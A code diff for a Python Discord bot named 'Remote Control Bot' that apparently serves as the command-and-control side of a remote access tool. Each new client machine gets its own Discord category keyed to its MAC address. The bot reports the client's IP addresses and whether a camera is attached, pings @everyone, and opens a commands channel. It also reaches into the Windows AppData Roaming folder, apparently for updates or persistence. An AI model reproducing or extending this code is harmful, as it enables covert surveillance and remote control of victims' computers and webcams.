@@ -110,32 +110,44 @@ async def on_ready():
         existing_category = nextcord.utils.get(guild.categories, name=str(ip))
         
         if not existing_category:
-            await channel12.send("New client added to network, info:")
+
             category = await guild.create_category(str(ip))
+            await guild.create_text_channel("info", category=category)
+            await guild.create_text_channel("events", category=category)
+            await guild.create_text_channel("commands", category=category)
+            
             ipv6 = get_ipv6_address()
             ipv4 = get_device_ip4()
 
             cameras = check_connected_cameras()
             if cameras:
-                pass
+                cameras = "At least one camera found."
             else:
                 cameras = "No cameras found."
-            await channel12.send(f"Mac address:{ip}")
-            await channel12.send(f"Ipv6: {ipv6}")
-            await channel12.send(f"Ipv4: {ipv4}")
-            if not cameras == "No cameras found.":
-                await channel12.send("Cameras: at least one found!")
-            else:
-                await channel12.send("Cameras: no cameras found.")
-            await channel12.send("@everyone")
+
+            des = f"""Mac address: {ip}
+            Ipv6: {ipv6}
+            Ipv4: {ipv4}
+            Cameras: {cameras}
+            Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}
+            @everyone"""
+
+            embed = nextcord.Embed(title="New client on network!", timestamp=datetime.now(), colour=0xe4f500, description=des)
+            embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+            await channel12.send(embed=embed)
             
-            await guild.create_text_channel("info", category=category)
             channel = nextcord.utils.get(category.text_channels, name="info")
-            await channel.send(f"IPv6: {ipv6}")
-            await channel.send(f"IPv4: {ipv4}")
-            await channel.send(f"Cameras: {cameras}")
-            await guild.create_text_channel("events", category=category)
-            await guild.create_text_channel("commands", category=category)
+
+            des = f"""Mac address: {ip}
+            Ipv6: {ipv6}
+            Ipv4: {ipv4}
+            Cameras: {cameras}"""
+
+            embed = nextcord.Embed(title="Client info:", timestamp=datetime.now(), colour=0xe4f500, description=des)
+            embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+            await channel.send(embed=embed)
+
+
         if existing_category:
             user_profile = os.environ['USERPROFILE']
             target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
@@ -152,7 +164,7 @@ async def on_ready():
                     category = nextcord.utils.get(guild.categories, name=str(ip))
                     channel5 = nextcord.utils.get(category.text_channels, name="events")
 
-                    des = f"""Client {ip} updated to version v{tex}!
+                    des = f"""Client {ip} updated to version v{tex}
                     Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}"""
                     embed = nextcord.Embed(title="Client update complete!", timestamp=datetime.now(), colour=0x00b0f4, description=f"Client updated to version v{tex}")
                     embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
